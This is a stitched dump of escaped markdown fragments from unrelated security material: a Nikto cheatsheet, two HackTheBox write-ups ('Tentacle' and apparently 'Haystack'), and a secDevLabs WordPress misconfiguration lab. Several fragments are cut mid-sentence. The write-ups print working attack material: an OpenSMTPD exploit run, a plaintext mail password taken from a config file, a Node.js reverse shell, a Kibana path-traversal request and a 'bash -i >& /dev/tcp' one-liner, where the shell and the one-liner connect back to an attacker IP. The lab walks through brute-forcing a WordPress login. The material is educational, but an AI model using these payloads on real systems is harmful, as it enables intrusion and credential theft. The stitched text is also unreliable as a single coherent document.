It also checks for server configuration items such as the presence of multiple index files, HTTP server options, and will attempt to identify installed web servers and software. Scan items and plugins are frequently updated and can be automatically updated.\\n\\nNikto is not designed as a stealthy tool. It will test a web server in the quickest time possible, and is obvious in log files or to an IPS/IDS. However, there is support for LibWhisker's anti-IDS methods in case you want to give it a try (or test your IDS system).\\n\\nNot every check is a security problem. There are some items that are \"info only\" type checks that look for things that may not have a security flaw, but Pentester may not know are present on the server. These items are usually marked appropriately in the information printed. There are also some checks for unknown items which have been seen scanned for in log files.\\n\\nThe goal of the project is to examine a web server to find potential problems and security vulnerabilities, including:\\n\\n- Server and software misconfigurations\\n- Default files and programs\\n- Insecure files and programs\\n- Outdated servers and programs\\n- Pointers to lead a human tester to better manual testing\\n\\nNikto is built on LibWhisker2 (by Rain Forest Puppy) and can run on any platform which has a Perl environment. It supports SSL, proxies, host authentication, attack encoding and more.\\n\\n## Cheatsheet\\n\\n### To scan a particular host\\n```\\ndocker run -it --rm secsi/nikto -host &lt;target_ip_address&gt;\\n```\\n\\n### To scan a host on multiple ports (default = 80)\\n```\\ndocker run -it --rm  secsi/nikto -host &lt;target_ip_address&gt; -port [port number 1], [port number 2], [port number 3]\\n```\\n\\n### To scan a host and output fingerprinted information to a file\\n```\\ndocker run -it --rm -v &lt;output_dir&gt;:/output secsi/nikto -host &lt;target_ip_address&gt; -output /output/&lt;output_file&gt;\\n```\\n\\n### To use a proxy while scanning a host\\n```\\ndocker run -it --rm secsi/nikto -host &lt;target_ip_address&gt; -useproxy &lt;proxy_address&gt;\\n```</td>\n",

Made me learn a lot of stuff like dns records, proxychaining, kerberos and so on... As usual, I tried to explain the steps as simple as I can. Hope you'll find it useful; if so, consider [suporting](https://www.buymeacoffee.com/f4T1H21) a student to get `OSCP` exam and +respecting my profile in HTB.\\n\\n&lt;a href=\"https://app.hackthebox.eu/profile/184235\"&gt;\\n  &lt;img src=\"https://www.hackthebox.eu/badge/image/184235\" alt=\"f4T1H\"&gt;\\n  &lt;/img&gt;\\n&lt;/a&gt;\\n&lt;br&gt;\\n&lt;a href=\"https://www.buymeacoffee.com/f4T1H21\"&gt;\\n  &lt;img src=\"https://raw.githubusercontent.com/f4T1H21/f4T1H21/main/support.png\" height=\"40\" alt=\"Support\"&gt;\\n  &lt;/img&gt;\\n&lt;/a&gt;&lt;br&gt;&lt;br&gt;\\nNow, let me get right into it.\\n\\n---\\n\\n# Reconnaissance\\nThe cliche... :\\n```bash\\nnmap -sS -sV -sC -p- 10.10.10.224\\n```\\n```bash\\nPORT     STATE  SERVICE      VERSION\\n22/tcp   open   ssh          OpenSSH 8.0 (protocol 2.0)\\n| ssh-hostkey:\\n|   3072 8d:dd:18:10:e5:7b:b0:da:a3:fa:14:37:a7:52:7a:9c (RSA)\\n|   256 f6:a9:2e:57:f8:18:b6:f4:ee:03:41:27:1e:1f:93:99 (ECDSA)\\n|_  256 04:74:dd:68:79:f4:22:78:d8:ce:dd:8b:3e:8c:76:3b (ED25519)\\n53/tcp   open   domain       ISC BIND 9.11.20 (RedHat Enterprise Linux 8)\\n| dns-nsid:\\n|_  bind.version: 9.11.20-RedHat-9.11.20-5.el8\\n88/tcp   open   kerberos-sec MIT Kerberos (server time: 2021-06-17 12:49:01Z)\\n3128/tcp open   http-proxy   Squid http proxy 4.11\\n|_http-server-header: squid/4.11\\n|_http-title: ERROR: The requested URL could not be retrieved\\n9090/tcp closed zeus-admin\\nService Info: Host: REALCORP.HTB; OS: Linux; CPE: cpe:/o:redhat:enterprise_linux:8\\n```\\n\\nHere we have three ports except `22/ssh`, let's start with the kerberos server at the port `88/kerberos-sec`.\\n\\n## 88/kerberos-sec\\n\\nActually, we don't have much choice here, let's take a look at the binary web content:\\n```bash\\ncurl http://10.10.10.224:88 --http0.9 --output - | strings\\n```\\n```\\n`~^0\\\\n20210618150926Z\\nREALCORP.HTB\\nkrbtgt\\nREALCORP.HTB\\n```\\nWe got two things here:\\n- `REALCORP.HTB` which is a domain. (Also a clue about __default Kerberos 5 realm__)\\n- `krbtgt` which is the local default account which acts as a service account for the Key Distribution Center (KDC) service.\\n\\nAdd the domain to `/etc/hosts` and let's continue with the port `3128/http-proxy`.\\n\\n## 3128/http-proxy\\n![](src/3128browser.png)\\n\\nHere we got another two things:\\n- `j.nakazawa@realcorp.htb` a username and another domain.\\n- `srv01.realcorp.htb` a new __subdomain__.\\n\\nSee the subdomain? Maybe we need to enumerate the `53/dns` to find out what's going on.\\n\\n## 53/dns\\nAs I mentioned my previous writeups, I love using `gobuster`. You can go with `dnsenum`, `wfuzz` or your own tool...\\n- Let's go with the domain we found in the __mail__ address.\\n\\n```bash\\n┌──(root💀kali)-[~/hackthebox/tentacle]\\n└─&gt; gobuster -q dns -d realcorp.htb -r 10.10.10.224:53 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -i\\nFound: ns.realcorp.htb [10.197.243.77]\\nFound: proxy.realcorp.htb [10.197.243.77]\\nFound: wpad.realcorp.htb [10.197.243.31]\\nFound: srv01.realcorp.htb [10.10.10.224]\\n```\\nOh, here we found new subdomains and two new ip addresses. `proxy.realcorp.htb` is a [`CNAME`](https://en.wikipedia.org/wiki/CNAME_record) record to `ns.realcorp.htb` and `ns` stands for nameserver.&lt;br&gt;\\nAs you can guess, we can't access these ips directly, which means we need to use proxychaining to access them for this case.\\n\\n### `proxychains` configuration\\nWe are going to use a tool called `proxychains`, so make sure you installed it on your system.&lt;br&gt;\\nDo comment any other proxy entries and add the following lines at the end of your `/etc/proxychains.conf` file.\\n```\\nhttp\\t10.10.10.224 3128\\nhttp\\t127.0.0.1 3128\\nhttp\\t10.197.243.77 3128\\n```\\nWe're going with `strict_chain` but you can go with `dynamic_chain` too.\\n- Here's a [video](https://www.youtube.com/watch?v=NN9fQwiomAU) to understand `proxychains` mechanism.\\n\\nNow, we're ready to look at the ip: `10.197.243.31`&lt;br&gt;\\nLet's scan it:\\n```bash\\n┌──(root💀kali)-[~/hackthebox/tentacle]\\n└─&gt; proxychains -q nmap -sT -Pn 10.197.243.31 --top-ports 1000\\nHost discovery disabled (-Pn).

Once detection and download of the configuration file is complete, it can be executed to determine the proxy for a specified URL. Default name for the configuration file is: `wpad.dat`\\n\\nHere we see an http server, let's look for the file.\\n\\n- First add `10.197.243.31 wpad.realcorp.htb` to your `/etc/hosts`.\\n\\n```bash\\n┌──(root💀kali)-[~/hackthebox/tentacle]\\n└─&gt; proxychains -q curl http://wpad.realcorp.htb/wpad.dat\\nfunction FindProxyForURL(url, host) {\\n    if (dnsDomainIs(host, \"realcorp.htb\"))\\n        return \"DIRECT\";\\n    if (isInNet(dnsResolve(host), \"10.197.243.0\", \"255.255.255.0\"))\\n        return \"DIRECT\";\\n    if (isInNet(dnsResolve(host), \"10.241.251.0\", \"255.255.255.0\"))\\n        return \"DIRECT\";\\n\\n    return \"PROXY proxy.realcorp.htb:3128\";\\n}\\n```\\n\\nThis time we catch a tartar, that's a totally new `subnet`...&lt;br&gt;\\nWe can't use host discovery in `nmap`, that makes things too long. But I used my mind and made things easier; while scanning the whole ip range, I encountered one ` ... OK` and moved from that ip address.\\n\\n![](src/subnetscan.png)\\n\\n# Foothold: CVE 2020-7247\\nLet's scan this ip address's running service versions:\\n\\n```bash\\nproxychains nmap -sT -sV -Pn 10.241.251.113 --top-ports 100\\n```\\n```c\\nPORT   STATE SERVICE VERSION\\n25/tcp open  smtp    OpenSMTPD\\nService Info: Host: smtp.realcorp.htb\\n```\\nAfter googling a bit about `OpenSMTPD`, I found [this](https://www.qualys.com/2020/01/28/cve-2020-7247/lpe-rce-opensmtpd.txt) article. Now time to exploit it, I tried many exploits from the internet but I'm going to recommend you to use my PoC exploit from [this](https://github.com/f4T1H21/CVE-2020-7247) link. You can see, it definitely makes sense!\\n\\n```bash\\n┌──(root💀f4T1H)-[~/hackthebox/tentacle]\\n└─&gt; proxychains -q python3 exploit.py 10.241.251.113 25 j.nakazawa@realcorp.htb 10.10.14.166 2121\\n[+] Opening connection to 10.241.251.113 on port 25: Done\\n[+] Target port is running OpenSMTPD!\\n[+] Sending HELO: Done\\n[+] Target is vulnerable!\\n[+] Checking the mail address: Valid\\n[+] Sending the payload: Done\\n[*] Closed connection to 10.241.251.113 port 25\\n---------------------------------------------------------\\n[+] Trying to bind to 10.10.14.166 on port 2121: Done\\n[+] Waiting for connections on 10.10.14.166:2121: Got connection from 10.10.10.224 on port 36780\\n[*] Switching to interactive mode\\nbash: cannot set terminal process group (545): Inappropriate ioctl for device\\nbash: no job control in this shell\\nroot@smtp:~&gt; $ id\\nid\\nuid=0(root) gid=0(root) groups=0(root)\\nroot@smtp:~&gt; $\\n```\\nHere we finally got a shell as `root`, but in the `smtp` server.\\nAfter a bit of enumeratig, I found `msmtp` client configuration file in `/home/j.nakazawa/.msmtprc`.\\n\\n```bash\\nroot@smtp:/home/j.nakazawa&gt; $ cat .msmtprc\\ncat .msmtprc\\n# Set default values for all following accounts.\\ndefaults\\nauth           on\\ntls            on\\ntls_trust_file /etc/ssl/certs/ca-certificates.crt\\nlogfile        /dev/null\\n\\n# RealCorp Mail\\naccount        realcorp\\nhost           127.0.0.1\\nport           587\\nfrom           j.nakazawa@realcorp.htb\\nuser           j.nakazawa\\npassword       sJB}RM&gt;6Z~64_\\ntls_fingerprint    C9:6A:B9:F6:0A:D4:9C:2B:B9:F6:44:1F:30:B8:5E:5A:D8:0D:A5:60\\n\\n# Set a default account\\naccount default : realcorp\\nroot@smtp:/home/j.nakazawa&gt; $\\n```\\nAnd here we got some credentials: `j.nakazawa`:`sJB}RM&gt;6Z~64_`&lt;br&gt;\\nBut weirdly ssh was not working for direct login with these credentials!&lt;br&gt;&lt;br&gt;\\nThinking about generally a little bit, gives us the big clue: As you can remember we have a `kerberos-sec` server on the main target, which means we can use tickets to authenticate in something if it configured properly!\\n\\n![](/src/gifs/bingobango.gif)\\n\\nOkay, let me take one step back:\\n\\n- What is `kerberos`?\\n&gt;A computer-network authentication protocol that works on the basis  of tickets to allow nodes communicating over a non-secure network to  prove their identity to one another in a secure manner.\\n\\n## Creating a `kerberos` ticket\\n### Step #1\\nFirst install the package by typing:\\n```bash\\napt-get install krb5-user\\n```\\n\\n__Attention__: Now we need to configure the kerberos by editing `/etc/krb5.conf`, for that you need to add following lines to their proper sections in the file.\\n```bash\\n[libdefaults]\\n        default_realm = REALCORP.HTB\\n\\n[realms]\\n        REALCORP.HTB = {\\n                kdc = 10.10.10.224\\n        }\\n\\n[domain_realm]\\n        .realcorp.htb = REALCORP.HTB\\n```\\n### Step #2\\nCreate a ticket for the user `j.nakazawa`:\\n```bash\\n┌──(root💀f4T1H)-[~/hackthebox/tentacle]\\n└─&gt; kinit j.nakazawa\\nPassword for j.nakazawa@REALCORP.HTB:\\n\\n```\\nEnter the password, and we're ready to go. But first, check the ticket we created:\\n```bash\\n┌──(root💀f4T1H)-[~/hackthebox/tentacle]\\n└─&gt; klist           \\nTicket cache: FILE:/tmp/krb5cc_0\\nDefault principal: j.nakazawa@REALCORP.HTB\\n\\nValid starting       Expires              Service principal\\n06/19/2021 07:12:33  06/20/2021 07:00:21  krbtgt/REALCORP.HTB@REALCORP.HTB\\n```\\n\\n__Atention__: Make sure you only have the following domain for the `10.10.10.224` ip address in your `/etc/hosts` file.\\n```c\\n10.10.10.224    srv01.realcorp.htb\\n```\\n## Step #3\\nConnect directly via ssh as the user `j.nakazawa`:\\n```bash\\n┌──(root💀f4T1H)-[~/hackthebox/tentacle]\\n└─&gt; ssh j.nakazawa@10.10.10.224\\nActivate the web console with: systemctl enable --now cockpit.socket\\n\\nLast login: Sat Jun 19 05:26:12 2021 from 10.10.14.166\\n[j.nakazawa@srv01 ~]$ id\\nuid=1000(j.nakazawa) gid=1000(j.nakazawa) groups=1000(j.nakazawa),23(squid),100(users) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023\\n[j.nakazawa@srv01 ~]$\\n```\\nHere we finally got the user ...\\n\\n# Privilege escalation:\\n## Escalating `admin`: Cronjob abuse\\nWhile enumerating the box, I came out with the following `cronjob`:\\n```bash\\n[j.nakazawa@srv01 ~]$ cat /etc/crontab\\nSHELL=/bin/bash\\nPATH=/sbin:/bin:/usr/sbin:/usr/bin\\nMAILTO=root\\n\\n# For details see man 4 crontabs\\n\\n# Example of job definition:\\n# .---------------- minute (0 - 59)\\n# |  .------------- hour (0 - 23)\\n# |  |  .---------- day of month (1 - 31)\\n# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...\\n# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat\\n# |  |  |  |  |\\n# *  *  *  *  * user-name  command to be executed\\n* * * * * admin /usr/local/bin/log_backup.sh\\n[j.nakazawa@srv01 ~]$\\n```\\n\\n__/usr/local/bin/log_backup.sh__\\n```bash\\n#!/bin/bash\\n\\n/usr/bin/rsync -avz --no-perms --no-owner --no-group /var/log/squid/ /home/admin/\\ncd /home/admin\\n/usr/bin/tar czf squid_logs.tar.gz.`/usr/bin/date +%F-%H%M%S` access.log cache.log\\n/usr/bin/rm -f access.log cache.log\\n```\\nBasically this script copies all the content of `/var/log/squid/` to `/home/admin`.\\n\\n```bash\\n[j.nakazawa@srv01 tmp]$ id\\nuid=1000(j.nakazawa) gid=1000(j.nakazawa) groups=1000(j.nakazawa),23(squid),100(users) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023\\n[j.nakazawa@srv01 tmp]$ ls /var/log -lah | grep squid\\ndrwx-wx---.  3 admin  squid    53 Jun 19 05:49 squid\\n[j.nakazawa@srv01 tmp]$\\n```\\n\\nHere you can see we are in the group of `squid`, we can write and execute the content of `/var/log/squid`. So if we put something into `/var/log/squid` it'll be copied to `/home/admin`. It may take a long or a short time depending on the size of the directory.&lt;br&gt;&lt;br&gt;\\nThe initial idea was copying our public ssh key to `/home/admin/.ssh/authorized_keys`, but after further testing I came out to the conclusion that it is not allowed/enabled.\\n\\nHmm let's think about the clue, you remember what was it? Yeah, you're right it is literally: `Kerberos`&lt;br&gt;\\nAfter some googling, I got [this](https://web.mit.edu/kerberos/krb5-1.5/krb5-1.5.4/doc/krb5-user/Granting-Access-to-Your-Account.html) article.\\n\\n&gt;If you need to give someone access to log into your account, you can do so through `Kerberos`, without telling the person your password. Simply create a file called `.k5login` in your home directory. This file should contain the `Kerberos principal` of each person to whom you wish to give access.

But it does isn't easy at all. It's annoying to find the user and password in the messy Spanish. For the root, you should have a basic understanding of ELK. Hence, the box is quite fresh in htb.\\n\\n## Information Enumeration\\n\\nAs usual, nmap is utilized to detect detailed ports and services.\\n\\n```\\n# Nmap 7.70 scan initiated Sun Jun 30 01:10:53 2019 as: nmap -sT -p- --min-rate 1500 -oN ports 10.10.10.115\\nNmap scan report for 10.10.10.115\\nHost is up (0.27s latency).\\nNot shown: 65532 filtered ports\\nPORT     STATE SERVICE\\n22/tcp   open  ssh\\n80/tcp   open  http\\n9200/tcp open  wap-wsp\\n```\\n\\nThen detect the detailed services:\\n\\n```\\n# Nmap 7.70 scan initiated Sun Jun 30 01:13:05 2019 as: nmap -sC -sV -p22,80,9200 -oN services 10.10.10.115\\nNmap scan report for 10.10.10.115\\nHost is up (0.38s latency).\\n\\nPORT     STATE SERVICE VERSION\\n22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)\\n| ssh-hostkey:\\n|   2048 2a:8d:e2:92:8b:14:b6:3f:e4:2f:3a:47:43:23:8b:2b (RSA)\\n|   256 e7:5a:3a:97:8e:8e:72:87:69:a3:0d:d1:00:bc:1f:09 (ECDSA)\\n|_  256 01:d2:59:b2:66:0a:97:49:20:5f:1c:84:eb:81:ed:95 (ED25519)\\n80/tcp   open  http    nginx 1.12.2\\n|_http-server-header: nginx/1.12.2\\n|_http-title: Site doesn't have a title (text/html).\\n9200/tcp open  http    nginx 1.12.2\\n|_http-server-header: nginx/1.12.2\\n|_http-title: 502 Bad Gateway\\n```\\n\\nFor port 80, we find nothing except a picture of a needle. Exiftool is used to analyze. But nothing interesting found. Try to use gobuster to brute force the directory, but have not found any useful directories.\\n\\n![eDD780.png](https://s2.ax1x.com/2019/08/03/eDD780.png)\\n\\nFor port 9200, nmap seems to be failed to detect. But this port should be familiar to elasticserarch users. Elasticsearch is a popular search database in recent years. Something is interesting in elasticsearch. We will talk about this later.\\n\\n![eDrFKO.png](https://s2.ax1x.com/2019/08/03/eDrFKO.png)\\n\\n## Exploit\\n\\nIn the above, we have talked about the ports. The elasticsearch should be the point. Try to obtain the data of elasticsearch. There is no authentication for elasticsearch in default. Hence, we can read the data from elasticsearh. In the beginning, I have tried to use kibana to analyze the data. Kibana is one component of ELK, which is a powerful tool to analyze the data of elasticsearch. And it's easy to use. Just download the [files](https://www.elastic.co/cn/downloads/past-releases/kibana-6-4-2), then decompress the files. There is only one step to finish before run kibana. Modify `elasticsearch.url` in `config.yml`, it should be configured to `10.10.10.115:9200`. Then you can run kibana directly.\\n\\nWhen you access to kibana, you will find two indexes: `bank` and `quotes`. The `bank` seems to be data of bank users information, which seems not to be useful. For index `quotes`, we have found nothing but the quote of Spanish. To be honest, Spanish is really messy for me to read. And I cannot find anything interesting. Kibana is useful for query specific field. But `quotes` seems to be an article. So I decide to dump all the data of `quotes`. \\n\\n[elasticsearh-dump](https://github.com/taskrabbit/elasticsearch-dump) is useful to dump the data from elasticsearch. Firstly, install the tool by `npm install elasticdump -g`. Then dump the data by: \\n\\n```\\nelasticdump \\\\n  --input=http://production.es.com:9200/quotes \\\\n  --output=quptes.json \\\\n  --type=data\\n```\\n\\nThe result will be json file of a list of objects consist of some keys. The most important is the quote in the result. But the json is still not convenient to read. And the id may be the sequence of quotes. So, I decide to write a script to order the quotes by id and join all the quotes together.\\n\\n```python\\nimport json\\nresult = {}\\ntxt = \"\"\\nwith open(\"quotes.json\") as f:\\n  data = f.readlines()\\n  for ele in data:\\n    obj = json.loads(ele)\\n    id = int(obj[\"_id\"])\\n    result[id] = obj[\"_source\"][\"quote\"]\\n  for i in sorted(result.keys()):\\n    print(i)\\n    txt = txt + result[i] + \"\\n\\n\"\\nwith open(\"result.md\", \"w\") as f1:\\n  f1.write(txt)\\n```\\n\\nNow, I have the result of quotes. And it's easy to read. I place this file in Github. When I read this file by Chrome, Chrome can help me translate this article. So, it's easier to find special things in the article. I have found two interesting strings in the article.\\n\\n```\\nTengo que guardar la clave para la maquina: dXNlcjogc2VjdXJpdHkg\\n```\\n\\n```\\nEsta clave no se puede perder, la guardo aca: cGFzczogc3BhbmlzaC5pcy5rZXk=\\n```\\n\\nIf you translate the two stings into English respectively.\\n\\n```\\nI have to save the password for the machine: dXNlcjogc2VjdXJpdHkg\\n```\\n\\n```\\nThis key cannot be lost, I keep it here: cGFzczogc3BhbmlzaC5pcy5rZXk=\\n```\\n\\nThe end of the strings is encoded by base64. When decoded, we can find the username and password. Then you can ssh by the username and password. \\n\\n![erZrTA.png](https://s2.ax1x.com/2019/08/03/erZrTA.png)\\n\\nTo be honest, I don't like the user of the box. But it does works as the keyword: you have to find a needle in haystack.\\n\\n## PrivEsc\\n\\nIf you look around the box, you will find the box is installed with ELK. You can find kibana and logstash in the box. If you google `kibana exploit`. You will find [CVE-2018-17246](https://github.com/mpgn/CVE-2018-17246) in Github. It has detailed illustrates the ways to exploit.\\n\\nHowever, there is a problem that the kibana service is only running in local. So you cannot access kibana service externally. There is a way to utilize ssh to redirect the network stream.\\n\\n```\\nssh 5601:localhost:5601 security@10.10.10.115\\n```\\n\\nThen, we can access to the kibana service in 10.10.10.115 by access to `localhost:5601`. Place the `server.js` in tmp directory of the target machine.\\n\\n```\\n// server.js\\n(function(){\\n    var net = require(\"net\"),\\n        cp = require(\"child_process\"),\\n        sh = cp.spawn(\"/bin/sh\", []);\\n    var client = new net.Socket();\\n    client.connect(1234, \"10.10.16.61\", function(){\\n        client.pipe(sh.stdin);\\n        sh.stdout.pipe(client);\\n        sh.stderr.pipe(client);\\n    });\\n    return /a/; // Prevents the Node.js application form crashing\\n})();\\n```\\n\\nThen we can implement by burp, remember to set up nc listener `nc -lvnp 1234`\\n\\n```\\nGET /api/console/api_server?sense_version=@@SENSE_VERSION&amp;apis=../../../../../../.../../../../tmp/server.jssudo -l HTTP/1.1\\nHost: localhost:5601\\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\\nAccept: */*\\nAccept-Language: en-US,en;q=0.5\\nAccept-Encoding: gzip, deflate\\nReferer: http://localhost:5601/app/kibana\\ncontent-type: application/json\\nkbn-version: 6.4.2\\norigin: http://localhost:5601\\nConnection: close\\n```\\n\\nWait for a while, then we are kibana.\\n\\n[![erlWZT.png](https://s2.ax1x.com/2019/08/03/erlWZT.png)](https://imgchr.com/i/erlWZT)\\n\\nBut we are still not root! Don't be upset. Let's move on. If we look at the logstash in the machine carefully, we will find something interesting. We find the user group `kibana` has write permission of `conf.d` of logstash.\\n\\n```\\nls -lah\\ntotal 52K\\ndrwxr-xr-x.  3 root   root    183 jun 18 22:15 .\\ndrwxr-xr-x. 83 root   root   8,0K jun 24 05:44 ..\\ndrwxrwxr-x.  2 root   kibana   62 jun 24 08:12 conf.d\\n-rw-r--r--.  1 root   kibana 1,9K nov 28  2018 jvm.options\\n-rw-r--r--.  1 root   kibana 4,4K sep 26  2018 log4j2.properties\\n-rw-r--r--.  1 root   kibana  342 sep 26  2018 logstash-sample.conf\\n-rw-r--r--.  1 root   kibana 8,0K ene 23  2019 logstash.yml\\n-rw-r--r--.  1 root   kibana 8,0K sep 26  2018 logstash.yml.rpmnew\\n-rw-r--r--.  1 root   kibana  285 sep 26  2018 pipelines.yml\\n-rw-------.  1 kibana kibana 1,7K dic 10  2018 startup.option\\n```\\n\\n`conf.d` is the config directory of logstash consists of three files in general. Take a deep look into the directory, you'll find an interesting thing. There is a command executes in `output.conf`. If you have basic knowledge of logstash, you should know the function of the three files. `input.conf` is used to config the data source. `filter.conf` is used to process the data, which is usually combined with grok. `output.conf` is used to output the processed data. We can find there is an `exec` in the `output.conf`.\\n\\nSo the exploit is very clear. Create a file in `/opt/kibana/` whose name begins with `logstah_`. And make sure the content in the file can be parsed by grok correctly. Then the command can be executed successfully. The most important part is how to create the content to be parsed to correct `comando`. So you should know how to use grok. Grok is utilized to recognize specific fields by the regular expression. [Grok Debugger] is a useful tool to test grok online.\\n\\n![eyPIxg.png](https://s2.ax1x.com/2019/08/04/eyPIxg.png)\\n\\nThe expression is quite simple. If you know the regular expression, it will not be hard to understand the expression here.\\n\\n**filter.conf**\\n\\n```\\nfilter {\\n        if [type] == \"execute\" {\\n                grok {\\n                        match =&gt; { \"message\" =&gt; \"Ejecutar\\s*comando\\s*:\\s+%{GREEDYDATA:comando}\" }\\n                }\\n        }\\n}\\n```\\n\\n**input.conf**\\n\\n```\\ninput {\\n        file {\\n                path =&gt; \"/opt/kibana/logstash_*\"\\n                start_position =&gt; \"beginning\"\\n                sincedb_path =&gt; \"/dev/null\"\\n                stat_interval =&gt; \"10 second\"\\n                type =&gt; \"execute\"\\n                mode =&gt; \"read\"\\n        }\\n}\\n```\\n\\n**output.conf**\\n\\n```\\noutput {\\n        if [type] == \"execute\" {\\n                stdout { codec =&gt; json }\\n                exec {\\n                        command =&gt; \"%{comando} &amp;\"\\n                }\\n        }\\n}\\n```\\n\\nNow, we have known how to create the corresponding `comando`. The next step is to choose the command to execute. There is not nc in the machine. But there's python and perl in the machine. But the reverse shell command is a little long. So I choose to use `bash -i &gt;&amp; /dev/tcp/10.10.16.61/1234 0&gt;&amp;1`. Write the content to the corresponding file:\\n\\n```\\necho \"Ejecutar  comando: bash -i &gt;&amp; /dev/tcp/10.10.16.61/1234 0&gt;&amp;1\" &gt; /opt/kibana/logstash_1.txt\\n```\\n\\nUse the nc to listen at port 1234, wait a while, root is coming.\\n\\n![eykUVs.png](https://s2.ax1x.com/2019/08/04/eykUVs.png)\\n</td>\n",

Automated scanners are useful for detecting misconfigurations, use of default accounts or configurations, unnecessary services, legacy options, etc.\\n\\nThe main goal of this app is to discuss how **Security Misconfiguration** vulnerabilities can be exploited and to encourage developers to send secDevLabs Pull Requests on how they would mitigate these flaws.\\n\\n## Setup\\n\\nTo start this intentionally **insecure application**, you will need [Docker][docker install] and [Docker Compose][docker compose install]. After forking [secDevLabs](https://github.com/globocom/secDevLabs), you must type the following commands to start:\\n\\n```sh\\ncd secDevLabs/owasp-top10-2021-apps/a5/misconfig-wordpress\\n```\\n\\n```sh\\nmake install\\n```\\n\\nThen simply visit [localhost:8000][app] ! 😆\\n\\n## Get to know the app 📄\\n\\nTo properly understand how this application works, you can try to:\\n\\n- Visit its homepage!\\n\\n## Attack narrative\\n\\nNow that you know the purpose of this app, what could go wrong? The following section describes how an attacker could identify and eventually find sensitive information about the app or its users. We encourage you to follow these steps and try to reproduce them on your own to better understand the attack vector! 😜\\n\\n### 👀\\n\\n#### Verbose error message allows for username enumeration\\n\\nIt's possible to reach the site through the HTTP port 8000, as shown by the image below:\\n\\n&lt;p align=\"center\"&gt;\\n    &lt;img src=\"images/banner.png\"/&gt;\\n&lt;/p&gt;\\n\\nHaving a closer look at what's written bellow `SECWEB` we have a sign that the site might be using the WordPress CMS. We can confirm that suspicion by trying to access the `/wp-admin` page. As we can see from the image below, our suspicion is confirmed:\\n\\n &lt;p align=\"center\"&gt;\\n    &lt;img src=\"images/attack1.png\"/&gt;\\n&lt;/p&gt;\\n\\nAn attacker could try to log in with the username: `admin` and realize, through the error message, that `admin` is a valid user, as depicted by the image below:\\n\\n &lt;p align=\"center\"&gt;\\n    &lt;img src=\"images/attack2.png\"/&gt;\\n&lt;/p&gt;\\n\\n### 🔥\\n\\nAt this moment, an attacker could use [Burp Suite](https://portswigger.net/burp) to perform a brute force attack using this [wordlist] (if you need any help setting up your proxy you should check this [guide](https://support.portswigger.net/customer/portal/articles/1783066-configuring-firefox-to-work-with-burp)). To do so, after finding the login POST request, right click and send to Intruder, as shown below:\\n\\n &lt;p align=\"center\"&gt;\\n    &lt;img src=\"images/attack10.png\"/&gt;\\n&lt;/p&gt;\\n\\nIn the `Positions` tab, all fields must be cleared first via the `Clear §` button. To set `pwd` to change according to each password from our dictionary wordlist, simply click on `Add §` button after selecting it:\\n\\n &lt;p align=\"center\"&gt;\\n    &lt;img src=\"images/attack11.png\"/&gt;\\n&lt;/p&gt;\\n\\nIf a valid password is found, the application may process new cookies and eventually redirect the flow to other pages. To guarantee that the brute force attack follows this behavior, set `Always` into `Follow Redirections` options in the `Options` tab, as shown below:\\n\\n&lt;p align=\"center\"&gt;\\n    &lt;img src=\"images/attack13.png\"/&gt;\\n&lt;/p&gt;\\n\\nIn `Payloads` tab, simply choose the wordlist from `Load...` option and then the attack may be performed via the `Start attack` button:\\n\\n &lt;p align=\"center\"&gt;\\n    &lt;img src=\"images/attack12.png\"/&gt;\\n&lt;/p&gt;\\n\\nAfter sending at around 200 requests to try and obtain a valid admin password, it is possible to see from the image below that the app redirected us when the password `password` was used, thus giving us evidence that it might be the `admin` password.\\n\\n &lt;p align=\"center\"&gt;\\n    &lt;img src=\"images/attack3.png\"/&gt;\\n&lt;/p&gt;\\n\\nThe suspicion was confirmed when trying to log in with these credentials. As shown below:\\n\\n &lt;p align=\"center\"&gt;\\n    &lt;img src=\"images/attack3.1.png\"/&gt;\\n&lt;/p&gt;\\n\\n---\\n\\n### 👀\\n\\n#### Outdated WordPress is vulnerable to an authenticated arbitrary file deletion\\n\\nNow that we know we're dealing with a WordPress, we can use the [WPScan] tool to perform a sweep in the app in search for known vulnerabilities. The following command can be used to install it:\\n\\n```sh\\nbrew install wpscan\\n```\\n\\nAnd then use this command to start a new simple scan:\\n\\n```sh\\nwpscan -u localhost:8000\\n```\\n\\n &lt;p align=\"center\"&gt;\\n    &lt;img src=\"images/attack4.png\"/&gt;\\n&lt;/p&gt;\\n\\n### 🔥\\n\\nAs seen from the image above, the tool found out that the CMS version is outdated and vulnerable to an Authenticated Arbitrary File Deletion. By using [searchsploit] tool an attacker could find a [malicious code] to exploit this vulnerability.\\n\\nTo install this tool, simply type the following in your OSX terminal:\\n\\n```sh\\n⚠️ 'The next command will install several exploit codes in your system and many of them may trigger antiviruses alerts'\\n\\nbrew install exploitdb\\n```\\n\\nThen simply search for the version of the CMS found:\\n\\n```sh\\nsearchsploit wordpress 4.9.6\\n```\\n\\n &lt;p align=\"center\"&gt;\\n    &lt;img src=\"images/attack5.png\"/&gt;\\n&lt;/p&gt;\\n\\n---\\n\\n## 👀\\n\\n#### Security misconfiguration allows for a browseable directory on the server\\n\\nBy having another look at the results from [WPScan], it's possible to see that the tool found a browseable directory in the app: `/wp-content/uploads/`, as we can see from the image below:\\n\\n &lt;p align=\"center\"&gt;\\n    &lt;img src=\"images/attack6.png\"/&gt;\\n&lt;/p&gt;\\n\\n## 🔥\\n\\nWe can confirm that the directory is browseable by accessing it through a web browser, as shown by the following image:\\n\\n &lt;p align=\"center\"&gt;\\n    &lt;img src=\"images/attack7.png\"/&gt;\\n&lt;/p&gt;\\n\\n---\\n\\n## 👀\\n\\n#### Misconfigured headers give away unnecessary information about the server\\n\\nUsing [Nikto] tool to perform a security check scan, it's possible to see that there are multiple points of attention regarding security headers.\\n\\nTo install it, you can use the following command in your OSX terminal:\\n\\n```sh\\nbrew install nikto\\n```\\n\\nThen scan the web app using:\\n\\n```sh\\nnikto -h http://localhost:8000/\\n```\\n\\n &lt;p align=\"center\"&gt;\\n    &lt;img src=\"images/attack8.png\"/&gt;\\n&lt;/p&gt;\\n\\nNow, by doing the following curl command to check the HTTP headers of the application, we can confirm that it indeed exposes the PHP version installed, as shown by the image 